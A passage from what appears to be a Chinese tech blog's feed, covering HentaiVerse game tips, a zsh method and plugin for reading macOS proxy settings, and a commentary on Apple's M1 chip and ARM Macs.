而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">[译] HentaiVerse 建议和指导</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-07</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-11</div>\n</div>\n<div class=\"license-meta-item\">\n<div 